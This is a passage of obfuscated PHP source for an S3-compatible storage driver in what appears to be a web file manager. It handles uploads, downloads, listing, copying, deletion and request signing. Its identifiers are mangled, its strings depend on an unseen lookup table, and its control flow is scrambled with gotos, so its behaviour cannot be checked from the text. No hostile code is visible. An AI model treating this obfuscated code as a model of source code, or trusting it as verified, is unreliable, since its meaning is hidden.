$_SERVER[õëù©û]; $D¨÷¬œÇ““ = explode($a›´¾‡¬š[8], trim($bèµÛ×¡Ñ, $a›´¾‡¬š[8])); $b©ˆ„ÈçÇÈ = 0; do { ++$b©ˆ„ÈçÇÈ; $F¯¶È¸¢šø[] = implode($a›´¾‡¬š[8], array_slice($D¨÷¬œÇ““, 0, $b©ˆ„ÈçÇÈ)) . $a›´¾‡¬š[8]; } while ($b©ˆ„ÈçÇÈ < count($D¨÷¬œÇ““)); $F¯¶È¸¢šø[count($D¨÷¬œÇ““) - 1] = $bèµÛ×¡Ñ; return $F¯¶È¸¢šø; } public function getHost() { $e•®åÒ»¯ =& $_SERVER[õëù©û]; $c†ˆè¡½Ó¿ = parse_url(trim($this->domain, $e•®åÒ»¯[8])); $e½£½óš„ã = isset($c†ˆè¡½Ó¿[$e•®åÒ»¯[164]]) ? $c†ˆè¡½Ó¿[$e•®åÒ»¯[164]] : http_type(); $EˆÅ·Ü¢· = isset($c†ˆè¡½Ó¿[$e•®åÒ»¯[165]]) ? $c†ˆè¡½Ó¿[$e•®åÒ»¯[165]] : $c†ˆè¡½Ó¿[$e•®åÒ»¯[75]]; if (isset($c†ˆè¡½Ó¿[$e•®åÒ»¯[166]])) { $EˆÅ·Ü¢· .= $e•®åÒ»¯[4] . $c†ˆè¡½Ó¿[$e•®åÒ»¯[166]]; } return $e½£½óš„ã . $e•®åÒ»¯[167] . $EˆÅ·Ü¢·; } public function pathEncode($F¼»¨´Ã) { $c„ã”Í¥½Ê =& $_SERVER[õëù©û]; return str_replace($c„ã”Í¥½Ê[168], $c„ã”Í¥½Ê[8], rawurlencode($F¼»¨´Ã)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($E¥¨Ïê¯¶) { set_timeout(); require_once SDK_DIR . $_SERVER[õëù©û][169]; parent::__construct(); $this->_init($E¥¨Ïê¯¶); } public function _init($CÙ²ææÁ) { foreach ($CÙ²ææÁ as $a´Ñ—¥İÊù => $c™ŒÔã‘é) { if (isset($this->{$a´Ñ—¥İÊù})) { $this->{$a´Ñ—¥İÊù} = $c™ŒÔã‘é; } } $this->endpoint = $CÙ²ææÁ[$_SERVER[õëù©û][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($CÇù¬¸Ê“ƒ = "\166\x34") { $this->signVer = $CÇù¬¸Ê“ƒ; $this->client->setSignatureVersion($CÇù¬¸Ê“ƒ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto cÖ£×Ú †; cÖ£×Ú †: $A­•±Ò¼Ş =& $_SERVER[õëù©û]; $BÌ´Ÿò¢½¦ = $this->getBucketCors(); if (!$BÌ´Ÿò¢½¦ || !is_array($BÌ´Ÿò¢½¦)) { return !1; } goto B…µŞ…ùİ; A‚¿˜¯°‡¤: $Fâƒ±·Ã¤ = array($A­•±Ò¼Ş[176], $A­•±Ò¼Ş[177], $A­•±Ò¼Ş[178], $A­•±Ò¼Ş[179], $A­•±Ò¼Ş[180]); $föí—Ş•¨µ = array_diff($Fâƒ±·Ã¤, $EÁ¡êÜáõ); return empty($föí—Ş•¨µ); goto a‡ÍŠÁ©ê®; B…µŞ…ùİ: if ($BÌ´Ÿò¢½¦[$A­•±Ò¼Ş[171]] != $A­•±Ò¼Ş[172] || $BÌ´Ÿò¢½¦[$A­•±Ò¼Ş[173]] != $A­•±Ò¼Ş[172]) { return !1; } $EÁ¡êÜáõ = array_map($A­•±Ò¼Ş[174], $BÌ´Ÿò¢½¦[$A­•±Ò¼Ş[175]]); if (!is_array($EÁ¡êÜáõ)) { $EÁ¡êÜáõ = array(); } goto A‚¿˜¯°‡¤; a‡ÍŠÁ©ê®: } public function mkfile($dº‹­İ­â×, $bæ„ââÃŞ = '', $aœ’ÑçãÉ = REPEAT_RENAME) { $a´†àÆšó¤ = $this->setContent($dº‹­İ­â×, $bæ„ââÃŞ); if ($a´†àÆšó¤ !== !1) { return $this->getPathOuter($dº‹­İ­â×); } return !1; } public function mkdir($cœÇÚ÷ßŠ–, $eŞàçó‰ˆ = REPEAT_SKIP) { if (empty($cœÇÚ÷ßŠ–)) { return !1; } if ($this->_isFolder($cœÇÚ÷ßŠ–)) { return $this->getPathOuter($cœÇÚ÷ßŠ–); } $CÒ«ÉŒœ‰¨ = $this->setContent($cœÇÚ÷ßŠ–, $_SERVER[õëù©û][33], !0); if ($CÒ«ÉŒœ‰¨ !== !1) { return $this->getPathOuter($cœÇÚ÷ßŠ–); } return !1; } public function copyFile($BîçÓæÚ¸Ó, $f¼ÁãèëË¾, $A›áöÌ™êØ = array()) { $bÜÀ§±ÍÁ¼ =& $_SERVER[õëù©û]; $B•¾º¿‚‘Ï = $this->objectMeta($BîçÓæÚ¸Ó); if (!$B•¾º¿‚‘Ï) { return !1; } if ($B•¾º¿‚‘Ï[$bÜÀ§±ÍÁ¼[77]] <= 1024 * 1024 * 200) { $E¹´°‰ŸŞ² = $this->client->copyObject($this->bucket, $BîçÓæÚ¸Ó, $this->bucket, $f¼ÁãèëË¾, $bÜÀ§±ÍÁ¼[181], $A›áöÌ™êØ); } else { $E¹´°‰ŸŞ² = $this->client->multiCopyObject($this->bucket, $BîçÓæÚ¸Ó, $this->bucket, $f¼ÁãèëË¾, $A›áöÌ™êØ); } $E¹´°‰ŸŞ² = $E¹´°‰ŸŞ² ? $this->getPathOuter($f¼ÁãèëË¾) : !1; return $E¹´°‰ŸŞ²; } public function moveFile($Fà‘ŠˆÇ‰ö, $a±Ë™Õ’èÕ) { if ($this->copyFile($Fà‘ŠˆÇ‰ö, $a±Ë™Õ’èÕ)) { $this->delFile($Fà‘ŠˆÇ‰ö); return $this->getPathOuter($a±Ë™Õ’èÕ); } return !1; } public function delFile($b‡ÕùçÉ°„) { return $this->client->deleteObject($this->bucket, $b‡ÕùçÉ°„); } public function delFolder($D‡Š££ïÌ¯) { goto B·›…Ûƒß†; bÆĞÉ®Êî: return $A›šÕÆì™ === $E©õÍÁ°¤ø ? !0 : !1; goto aáÇ¦’†ÀÏ; A™Ÿ¬ƒ“»: $A›šÕÆì™ = $E©õÍÁ°¤ø = 0; $c›´·‹ñÜô = array_chunk(array_keys($fˆ‘í‹Šœ), 1000); foreach ($c›´·‹ñÜô as $Eá¡°Ğîù) { $A›šÕÆì™++; $E©õÍÁ°¤ø += (int) $this->client->deleteObjects($this->bucket, $Eá¡°Ğîù); } goto bÆĞÉ®Êî; B·›…Ûƒß†: $BŠ¡«ÃÉÀ =& $_SERVER[õëù©û]; $fˆ‘í‹Šœ = $this->listObjs($D‡Š££ïÌ¯); if (!$fˆ‘í‹Šœ) { $D‡Š££ïÌ¯ = trim($D‡Š££ïÌ¯, $BŠ¡«ÃÉÀ[8]); if (!empty($D‡Š££ïÌ¯)) { $D‡Š££ïÌ¯ .= $BŠ¡«ÃÉÀ[8]; } return $this->delFile($D‡Š££ïÌ¯); } goto A™Ÿ¬ƒ“»; aáÇ¦’†ÀÏ: } public function rename($a‹ªÄ¥Ùƒ, $E§ä½ù‹ù«) { return $this->renameObject($a‹ªÄ¥Ùƒ, $E§ä½ù‹ù«); } public function listPath($D‘¨‹Ê²ˆ³, $aÔ’ÄÆ‚ˆø = false) { $cŞ¯¯¿ï¹… =& $_SERVER[õëù©û]; $cÓ‹…«±ÑÔ = $this->listObjs($D‘¨‹Ê²ˆ³, null, null, $cŞ¯¯¿ï¹…[8]); $Bøõ¿Ãíæ = array($cŞ¯¯¿ï¹…[74] => array(), $cŞ¯¯¿ï¹…[73] => array()); foreach ($cÓ‹…«±ÑÔ as $dÓÓ®ÓÃ³ => $Bí¥î«‡¿) { if ($dÓÓ®ÓÃ³ == $cŞ¯¯¿ï¹…[8]) { continue; } if (isset($Bí¥î«‡¿[$cŞ¯¯¿ï¹…[182]])) { $Bøõ¿Ãíæ[$cŞ¯¯¿ï¹…[74]][] = $this->folderInfo($Bí¥î«‡¿[$cŞ¯¯¿ï¹…[182]], $aÔ’ÄÆ‚ˆø); } else { if (substr($Bí¥î«‡¿[$cŞ¯¯¿ï¹…[28]], -1) == $cŞ¯¯¿ï¹…[8]) { continue; } $Bøõ¿Ãíæ[$cŞ¯¯¿ï¹…[73]][] = $this->fileInfo($Bí¥î«‡¿[$cŞ¯¯¿ï¹…[28]], $aÔ’ÄÆ‚ˆø, $Bí¥î«‡¿); } } return $Bøõ¿Ãíæ; } private function fileInfo($A›•õ²‰Ò¿, $BÜÈ‘»Ì†ë = false, $c•…¤šê° = array()) { goto e®³Ş¹ëß‹; dÊ£ƒİöÏÁ: return $EîÁÃÚ²»; goto EÄƒÈí‡; A¥Ğ†ºô•°: if (empty($c•…¤šê°)) { $c•…¤šê° = $this->objectMeta($A›•õ²‰Ò¿); if (!$c•…¤šê°) { return $EîÁÃÚ²»; } } if (isset($c•…¤šê°[$FÜä™ß³ù×[186]])) { $EîÁÃÚ²»[$FÜä™ß³ù×[106]] = $c•…¤šê°[$FÜä™ß³ù×[186]]; } if (isset($c•…¤šê°[$FÜä™ß³ù×[77]])) { $EîÁÃÚ²»[$FÜä™ß³ù×[77]] = $c•…¤šê°[$FÜä™ß³ù×[77]]; } goto dÊ£ƒİöÏÁ; e®³Ş¹ëß‹: $FÜä™ß³ù× =& $_SERVER[õëù©û]; if ($BÜÈ‘»Ì†ë) { return array($FÜä™ß³ù×[28] => $this->pathThis($A›•õ²‰Ò¿), $FÜä™ß³ù×[75] => $this->getPathOuter($A›•õ²‰Ò¿), $FÜä™ß³ù×[29] => $FÜä™ß³ù×[163], $FÜä™ß³ù×[156] => $this->ext($A›•õ²‰Ò¿), $FÜä™ß³ù×[77] => isset($c•…¤šê°[$FÜä™ß³ù×[77]]) ? $c•…¤šê°[$FÜä™ß³ù×[77]] : 0, $FÜä™ß³ù×[183] => 0, $FÜä™ß³ù×[106] => 0, $FÜä™ß³ù×[184] => !0, $FÜä™ß³ù×[185] => !0); } $EîÁÃÚ²» = array($FÜä™ß³ù×[28] => $this->pathThis($A›•õ²‰Ò¿), $FÜä™ß³ù×[75] => $this->getPathOuter($A›•õ²‰Ò¿), $FÜä™ß³ù×[29] => $FÜä™ß³ù×[163], $FÜä™ß³ù×[183] => 0, $FÜä™ß³ù×[106] => 0, $FÜä™ß³ù×[77] => 0, $FÜä™ß³ù×[156] => $this->ext($A›•õ²‰Ò¿), $FÜä™ß³ù×[184] => !0, $FÜä™ß³ù×[185] => !0); goto A¥Ğ†ºô•°; EÄƒÈí‡: } private function folderInfo($AÉ¹ƒà½½Á, $AáÁ…æîÏÛ = false) { goto b¦ ùÃãé; F¡Ë¹ã®ø: if (isset($C­™åôéï[$Bµ©äŒøŸ÷[186]])) { $b÷º¤¥´¾¤[$Bµ©äŒøŸ÷[183]] = $C­™åôéï[$Bµ©äŒøŸ÷[186]]; } return $b÷º¤¥´¾¤; goto båä£ßŠö÷; b¦Ğ×–š¤ß: if ($AÉ¹ƒà½½Á == $Bµ©äŒøŸ÷[33]) { return $b÷º¤¥´¾¤; } $AÉ¹ƒà½½Á = trim($AÉ¹ƒà½½Á, $Bµ©äŒøŸ÷[8]) . $Bµ©äŒøŸ÷[8]; $C­™åôéï = $this->objectMeta($AÉ¹ƒà½½Á); goto F¡Ë¹ã®ø; b¦ ùÃãé: $Bµ©äŒøŸ÷ =& $_SERVER[õëù©û]; if ($AáÁ…æîÏÛ) { return array($Bµ©äŒøŸ÷[28] => $this->pathThis($AÉ¹ƒà½½Á), $Bµ©äŒøŸ÷[75] => $this->getPathOuter($Bµ©äŒøŸ÷[8] . $AÉ¹ƒà½½Á), $Bµ©äŒøŸ÷[29] => $Bµ©äŒøŸ÷[76], $Bµ©äŒøŸ÷[184] => !0, $Bµ©äŒøŸ÷[185] => !0); } $b÷º¤¥´¾¤ = array($Bµ©äŒøŸ÷[28] => $this->pathThis($AÉ¹ƒà½½Á), $Bµ©äŒøŸ÷[75] => $this->getPathOuter($Bµ©äŒøŸ÷[8] . $AÉ¹ƒà½½Á), $Bµ©äŒøŸ÷[29] => $Bµ©äŒøŸ÷[76], $Bµ©äŒøŸ÷[183] => 0, $Bµ©äŒøŸ÷[106] => 0, $Bµ©äŒøŸ÷[184] => !0, $Bµ©äŒøŸ÷[185] => !0); goto b¦Ğ×–š¤ß; båä£ßŠö÷: } public function listObjs($a¹ˆšÛ³, $C¨ö‡Öà§¿ = null, $b¨ÈİÓ§Åñ = null, $d¤ÎÖÄ»Š = null) { $b°Ú’Ü¸­Ç =& $_SERVER[õëù©û]; $a¹ˆšÛ³ = trim($a¹ˆšÛ³, $b°Ú’Ü¸­Ç[8]); $eµäÜ“æ± = empty($a¹ˆšÛ³) ? $b°Ú’Ü¸­Ç[33] : $a¹ˆšÛ³ . $b°Ú’Ü¸­Ç[8]; return $this->client->getBucket($this->bucket, $eµäÜ“æ±, $C¨ö‡Öà§¿, $b¨ÈİÓ§Åñ, $d¤ÎÖÄ»Š, !0); } public function has($cÚÍ¾§, $CÊ¾¶ñÖò = false, $a¡ÉõØÎòô = true) { goto FÆ÷èâË·æ; FÆ÷èâË·æ: $D»é¼Ø””Ÿ =& $_SERVER[õëù©û]; $bÀ È°Ïê¥ = 0; $Fó„Ÿ¢éÁÕ = 0; goto cÉİÀ˜İé; cÉŞ‘ÖÏŸ: if ($CÊ¾¶ñÖò) { return array($D»é¼Ø””Ÿ[187] => $bÀ È°Ïê¥, $D»é¼Ø””Ÿ[188] => $Fó„Ÿ¢éÁÕ); } return !1; goto bùö”áÍÅ; cÉİÀ˜İé: $B¯ïë½äÍ… = $this->listObjs($cÚÍ¾§, null, null, $D»é¼Ø””Ÿ[8]); $B¯ïë½äÍ… = is_array($B¯ïë½äÍ…) ? $B¯ïë½äÍ… : array(); foreach ($B¯ïë½äÍ… as $dà¢šÂŞ¯•) { if (isset($dà¢šÂŞ¯•[$D»é¼Ø””Ÿ[28]]) && substr($dà¢šÂŞ¯•[$D»é¼Ø””Ÿ[28]], -1) != $D»é¼Ø””Ÿ[8]) { if (!$CÊ¾¶ñÖò && $a¡ÉõØÎòô) { return !0; } $bÀ È°Ïê¥++; } else { if (isset($dà¢šÂŞ¯•[$D»é¼Ø””Ÿ[182]])) { if (!$CÊ¾¶ñÖò && !$a¡ÉõØÎòô) { return !1; } $Fó„Ÿ¢éÁÕ++; } } } goto cÉŞ‘ÖÏŸ; bùö”áÍÅ: } public function listAll($cƒË‰ˆÊ‡ï) { $F£ÜŸ›óíø =& $_SERVER[õëù©û]; $AÂ½½±Š¡ù = $this->listObjs($cƒË‰ˆÊ‡ï); $bªá”ù¾¢« = $DÄ°Ò†“‹™ = array(); foreach ($AÂ½½±Š¡ù as $eÁ¥ã„ÈÄ‹ => $BÚëó„Ò) { $bªá”ù¾¢«[] = $BÚëó„Ò[$F£ÜŸ›óíø[28]]; $DÄ°Ò†“‹™[$eÁ¥ã„ÈÄ‹] = $BÚëó„Ò[$F£ÜŸ›óíø[77]]; } return $this->listAllFiles($cƒË‰ˆÊ‡ï, $bªá”ù¾¢«, $DÄ°Ò†“‹™); } public function canRead($b° ’çÂ£õ) { $eæˆ¨• ”„ =& $_SERVER[õëù©û]; $CÖ¾ˆ¶İ¤è = $this->client->getAccessControlPolicy($this->bucket, $b° ’çÂ£õ); if (!$CÖ¾ˆ¶İ¤è) { return !1; } return in_array($CÖ¾ˆ¶İ¤è, array($eæˆ¨• ”„[189], $eæˆ¨• ”„[190], $eæˆ¨• ”„[191])) ? !0 : !1; } public function canWrite($B›ÆèóÕ†) { $Dõ›²ØÁ£ =& $_SERVER[õëù©û]; $Fö·¡¼‹²™ = $this->client->getAccessControlPolicy($this->bucket, $B›ÆèóÕ†); if (!$Fö·¡¼‹²™) { return !1; } return in_array($Fö·¡¼‹²™, array($Dõ›²ØÁ£[189], $Dõ›²ØÁ£[190])) ? !0 : !1; } public function getContent($b¯™ªÊ•Ü) { return $this->client->getObject($this->bucket, $b¯™ªÊ•Ü); } public function setContent($EÎĞ»°¸›‹, $DºÃ´¢·½Æ = '', $bÅêĞè¥Ê = false) { goto E‘ª¿²Âƒ·; E‘ª¿²Âƒ·: $F„Òä»â· =& $_SERVER[õëù©û]; $EÎĞ»°¸›‹ = $bÅêĞè¥Ê ? trim($EÎĞ»°¸›‹, $F„Òä»â·[8]) . $F„Òä»â·[8] : $EÎĞ»°¸›‹; $eÓ¾£®˜Â® = get_file_mime(get_path_ext($EÎĞ»°¸›‹)); goto CçÉˆ£…ÆÕ; CçÉˆ£…ÆÕ: $b¿ÁœÎ‘¦‘ = $this->client->putObject($DºÃ´¢·½Æ, $this->bucket, $EÎĞ»°¸›‹, $F„Òä»â·[181], array(), $eÓ¾£®˜Â®); if (!$b¿ÁœÎ‘¦‘) { return !1; } if ($bÅêĞè¥Ê) { return !0; } goto DÒ´Ãµ½•; DÒ´Ãµ½•: $b¿ÁœÎ‘¦‘ = $this->copyFile($EÎĞ»°¸›‹, $EÎĞ»°¸›‹, array($F„Òä»â·[192] => $b¿ÁœÎ‘¦‘[$F„Òä»â·[193]])); return $b¿ÁœÎ‘¦‘ ? !0 : !1; goto cÁ±×ÊìªØ; cÁ±×ÊìªØ: } public function fileSubstr($C˜ï¢æñŞ†, $Aóì—ØÊõ–, $Bãé¤âù¼ª) { $aÍİÌÖë¬ = $Aóì—ØÊõ– + $Bãé¤âù¼ª - 1; return $this->client->getObject($this->bucket, $C˜ï¢æñŞ†, array($_SERVER[õëù©û][194] => "\x62\x79\x74\145\x73\75{$Aóì—ØÊõ–}\55{$aÍİÌÖë¬}")); } public function upload($eÏ’½Œ£õ, $a÷İîÜÎ±Š, $d•ˆçÊÓæ† = false, $bİù·Ü¯¦ = REPEAT_REPLACE) { $A×º§Ÿá˜ =& $_SERVER[õëù©û]; $e…Š¼¼ò’ = array($A×º§Ÿá˜[192] => @md5_file($a÷İîÜÎ±Š)); $Bœµğ÷é„ù = array($A×º§Ÿá˜[195] => get_file_mime(get_path_ext($eÏ’½Œ£õ))); if (IO::size($a÷İîÜÎ±Š) <= 1024 * 1024 * 200) { $e˜ã‰áÔ§ = $this->client->putObjectFile($a÷İîÜÎ±Š, $this->bucket, $eÏ’½Œ£õ, $A×º§Ÿá˜[181], $e…Š¼¼ò’, $Bœµğ÷é„ù); return !empty($e˜ã‰áÔ§) ? $this->getPathOuter($eÏ’½Œ£õ) : !1; } $a·²Åˆ‡ùë = $this->client->multiUploadObject($a÷İîÜÎ±Š, $this->bucket, trim($eÏ’½Œ£õ, $A×º§Ÿá˜[8]), $e…Š¼¼ò’, $Bœµğ÷é„ù); return $a·²Åˆ‡ùë ? $this->getPathOuter($eÏ’½Œ£õ) : !1; } public function download($d‚¢ˆç¸…÷, $cÃ×Û‚‰šĞ) { if (!@is_dir($this->pathFather($cÃ×Û‚‰šĞ)) && !IO::mkdir($this->pathFather($cÃ×Û‚‰šĞ))) { return !1; } $CµçÈ‹§Ü¾ = $this->client->getObject($this->bucket, $d‚¢ˆç¸…÷, array(), $cÃ×Û‚‰šĞ); return $CµçÈ‹§Ü¾ !== !1 ? $cÃ×Û‚‰šĞ : !1; } public function link($AÒ•Ìïœ¥¿, $D¾‡ÙŒò = array()) { $føĞî±¶ =& $_SERVER[õëù©û]; if ($this->signVer == $føĞî±¶[196]) { return $this->client->getAuthenticatedURL($this->bucket, $AÒ•Ìïœ¥¿, 3600 * 12, $D¾‡ÙŒò); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($AÒ•Ìïœ¥¿, $føĞî±¶[8]), 3600 * 12, $this->region, array(), !0, $D¾‡ÙŒò); } public function fileOut($B‹ëîØ²ªÙ, $Bíßè†³ = false, $BğËœ¤Å¶Ğ = false, $C±–ßõğÒ = '') { goto D¿‘ìæÚ››; D¿‘ìæÚ››: $bšñêôÈ‡ =& $_SERVER[õëù©û]; if (!$BğËœ¤Å¶Ğ) { $BğËœ¤Å¶Ğ = $this->pathThis($B‹ëîØ²ªÙ); } $EÚ¯Ø’İÙº = get_file_mime(get_path_ext($BğËœ¤Å¶Ğ)); goto A±Ì„•´æ; A±Ì„•´æ: if ($EÚ¯Ø’İÙº == $bšñêôÈ‡[197]) { return parent::fileOut($B‹ëîØ²ªÙ, $Bíßè†³, $BğËœ¤Å¶Ğ, $C±–ßõğÒ); } $Bíßè†³ = $Bíßè†³ ? $bšñêôÈ‡[198] : $bšñêôÈ‡[199]; $eä¢°¶•ªí = array($bšñêôÈ‡[200] => $Bíßè†³ . $bšñêôÈ‡[201] . rawurlencode($BğËœ¤Å¶Ğ), $bšñêôÈ‡[202] => $EÚ¯Ø’İÙº); goto DÎµš•ÌĞ; DÎµš•ÌĞ: $fÍø»é¿ìî = $this->link($B‹ëîØ²ªÙ, $eä¢°¶•ªí); $this->fileOutLink($fÍø»é¿ìî); goto B”ç™ˆÎÙ; B”ç™ˆÎÙ: } public function fileOutServer($D¨»à–ŠŒ‘, $EÒù‚Ëò = false, $bÌÙ›š¼§Œ = false, $Dê•ãÒÃ±´ = '') { parent::fileOut($D¨»à–ŠŒ‘, $EÒù‚Ëò, $bÌÙ›š¼§Œ, $Dê•ãÒÃ±´); } public function fileOutImage($BŠ‹î´¦¸£, $Dîº‚ëİË = 250) { $fœ‰•µÔ¦¡ = $this->link($BŠ‹î´¦¸£); $this->fileOutLink($fœ‰•µÔ¦¡); } public function fileOutImageServer($bàÕùÅÙÒÚ, $C„”ó‚Ó—¡ = 250) { parent::fileOutImage($bàÕùÅÙÒÚ, $C„”ó‚Ó—¡); } public function hashMd5($d¹¹Æ¼œßë, $F¹©›‡ìŞ» = '') { $d‹ñÖãôÕÏ =& $_SERVER[õëù©û]; $C¥ÚÙÇøÒÊ = $this->objectMeta($d¹¹Æ¼œßë); if (!$C¥ÚÙÇøÒÊ) { return !1; } $F¹©›‡ìŞ» = $F¹©›‡ìŞ» ? $F¹©›‡ìŞ» : _get($C¥ÚÙÇøÒÊ, $d‹ñÖãôÕÏ[203]); $F¹©›‡ìŞ» = $F¹©›‡ìŞ» ? $F¹©›‡ìŞ» : _get($C¥ÚÙÇøÒÊ, $d‹ñÖãôÕÏ[193], $d‹ñÖãôÕÏ[33]); return $F¹©›‡ìŞ»; } public function uploadFormData($BÆ…•‰ÆÉš, $fâõù‹¦¨¼ = 3600) { $c˜ŠÚƒˆÇˆ =& $_SERVER[õëù©û]; $fËÛá‹Ğƒ = $this->pathFather($BÆ…•‰ÆÉš); $fÕ˜¹¯†¦ = $this->client->getHttpUploadPostParams($this->bucket, $fËÛá‹Ğƒ, $c˜ŠÚƒˆÇˆ[181], $fâõù‹¦¨¼); return array_merge((array) $fÕ˜¹¯†¦, array($c˜ŠÚƒˆÇˆ[165] => $this->getHost())); } public function multiUploadFormData($Dƒî÷•ßø‘, $F´æ÷›‰ğ = 3600) { $Díš­¿Ô¨˜ =& $_SERVER[õëù©û]; $e†áÅáŸ…Ÿ = gmdate($Díš­¿Ô¨˜[204]); $F—‰‹ùšôå = array(); $Dù»“ªóåñ = $this->client->getUploadId($this->bucket, $Dƒî÷•ßø‘, $F—‰‹ùšôå); if (!$Dù»“ªóåñ) { return !1; } return array($Díš­¿Ô¨˜[205] => $Dù»“ªóåñ, $Díš­¿Ô¨˜[165] => $this->getHost() . $Díš­¿Ô¨˜[8] . $this->pathEncode($Dƒî÷•ßø‘), $Díš­¿Ô¨˜[206] => $e†áÅáŸ…Ÿ, $Díš­¿Ô¨˜[89] => $Dƒî÷•ßø‘); } public function multiUploadAuthData($E÷•§È£Ğ, $BõîÉ‚¥ª = array()) { goto A­ù•œ¦ÇÂ; D×ÇÍ¬Ù²£: if (strpos($a®‰Æ¢£Ğõ, $D‹½ˆ¬ùÒò[209]) === 0) { return array($D‹½ˆ¬ùÒò[216] => $cÌ¥ÂŒƒ’İ, $D‹½ˆ¬ùÒò[206] => $bë ùßÈÄ); } return $cÌ¥ÂŒƒ’İ; goto eÖ‹»åì±Ã; e¯´Øó×éƒ: $b¥¬¦Ä‘Œ¼ = array($D‹½ˆ¬ùÒò[208], $D‹½ˆ¬ùÒò[33], $D‹½ˆ¬ùÒò[115], $D‹½ˆ¬ùÒò[33], "\170\55\141\155\x7a\55\x64\x61\x74\x65\72{$bë ùßÈÄ}", $D‹½ˆ¬ùÒò[8] . $this->bucket . $D‹½ˆ¬ùÒò[8] . $this->pathEncode($BÖ†ˆİÒ“¢) . $a®‰Æ¢£Ğõ); if (strpos($a®‰Æ¢£Ğõ, $D‹½ˆ¬ùÒò[209]) === 0) { $b¥¬¦Ä‘Œ¼[0] = $D‹½ˆ¬ùÒò[210]; } if (isset($BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[211]]) && $BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[211]] == $D‹½ˆ¬ùÒò[212]) { $b¥¬¦Ä‘Œ¼[0] = $D‹½ˆ¬ùÒò[212]; } goto eÉ¼Û ³«õ; Aƒ®Ú·˜²ˆ: $BÖ†ˆİÒ“¢ = $BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[89]]; unset($BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[89]]); if (isset($BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[207]])) { $BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[206]] = $bë ùßÈÄ; return $this->listUploadParts($BÖ†ˆİÒ“¢, $BõîÉ‚¥ª); } goto e¯´Øó×éƒ; A­ù•œ¦ÇÂ: $D‹½ˆ¬ùÒò =& $_SERVER[õëù©û]; $bë ùßÈÄ = isset($BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[206]]) ? $BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[206]] : gmdate($D‹½ˆ¬ùÒò[204]); $a®‰Æ¢£Ğõ = isset($BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[156]]) ? $BõîÉ‚¥ª[$D‹½ˆ¬ùÒò[156]] : $D‹½ˆ¬ùÒò[33]; goto Aƒ®Ú·˜²ˆ; eÉ¼Û ³«õ: $c´‹§š‚ïÄ = implode($D‹½ˆ¬ùÒò[213], $b¥¬¦Ä‘Œ¼); $CÒë¯Ë¥² = base64_encode(hash_hmac($D‹½ˆ¬ùÒò[214], $c´‹§š‚ïÄ, $this->secret, !0)); $cÌ¥ÂŒƒ’İ = $D‹½ˆ¬ùÒò[215] . $this->accessKey . $D‹½ˆ¬ùÒò[4] . $CÒë¯Ë¥²; goto D×ÇÍ¬Ù²£; eÖ‹»åì±Ã: } public function listUploadParts($eæŞîœ‹ÎÄ, $BÌ…ÏƒéĞƒ = array()) { goto F¡±ÜƒõÇÔ; F¡±ÜƒõÇÔ: $b„Æ¾ÂÂå =& $_SERVER[õëù©û]; $cƒ¹¼“ØÒ = str_replace($b„Æ¾ÂÂå[217], $b„Æ¾ÂÂå[33], $BÌ…ÏƒéĞƒ[$b„Æ¾ÂÂå[156]]); $b³î”ˆŸ«¸ = $this->client->listParts($this->bucket, $eæŞîœ‹ÎÄ, $cƒ¹¼“ØÒ); goto dÌØ¼å“ªİ; dÌØ¼å“ªİ: if (!$b³î”ˆŸ«¸) { return !1; } unset($BÌ…ÏƒéĞƒ[$b„Æ¾ÂÂå[207]], $BÌ…ÏƒéĞƒ[$b„Æ¾ÂÂå[211]]); $BÌ…ÏƒéĞƒ[$b„Æ¾ÂÂå[89]] = $eæŞîœ‹ÎÄ; goto D‡Ù¨İìĞÒ; D‡Ù¨İìĞÒ: $b©„³ĞŒ¸ƒ = $this->multiUploadAuthData($eæŞîœ‹ÎÄ, $BÌ…ÏƒéĞƒ); if (empty($b©„³ĞŒ¸ƒ)) { return !1; } return array($b„Æ¾ÂÂå[216] => $b©„³ĞŒ¸ƒ, $b„Æ¾ÂÂå[206] => $BÌ…ÏƒéĞƒ[$b„Æ¾ÂÂå[206]], $b„Æ¾ÂÂå[218] => $b³î”ˆŸ«¸); goto f˜Ã–Ö¬—œ; f˜Ã–Ö¬—œ: } public function getHost() { return parent::getHost() . $_SERVER[õëù©û][8] . $this->bucket; } public function size($Bóº®ô¢ÇÁ) { $AçÛ¸ºÔ°í = $this->objectMeta($Bóº®ô¢ÇÁ); return $AçÛ¸ºÔ°í ? $AçÛ¸ºÔ°í[$_SERVER[õëù©û][77]] : 0; } public function info($e×Ëœ–‚µ) { if ($this->isFolder($e×Ëœ–‚µ)) { return $this->folderInfo($e×Ëœ–‚µ); } else { if ($this->isFile($e×Ëœ–‚µ)) { return $this->fileInfo($e×Ëœ–‚µ); } } return !1; } public function exist($d®„…“é¡Æ) { return $this->isFile($d®„…“é¡Æ) || $this->isFolder($d®„…“é¡Æ); } public function isFile($F‘ÎëñÖ) { return !$this->isFolder($F‘ÎëñÖ) && $this->objectMeta($F‘ÎëñÖ); } public function isFolder($b›“³º¬Ø„) { return $this->cacheMethod($_SERVER[õëù©û][219], $b›“³º¬Ø„); } protected function objectMeta($e¼ùˆÊœĞ) { return $this->cacheMethod($_SERVER[õëù©û][220], $e¼ùˆÊœĞ); } protected function _objectMeta($F†ñÉåÊµ) { $a¸ÂƒÍ½Ç =& $_SERVER[õëù©û]; $F†ñÉåÊµ = rtrim($F†ñÉåÊµ, $a¸ÂƒÍ½Ç[8]); try { $dÈĞİ‚‰ = $this->client->getObjectInfo($this->bucket, $F†ñÉåÊµ); if (!isset($dÈĞİ‚‰[$a¸ÂƒÍ½Ç[203]]) && 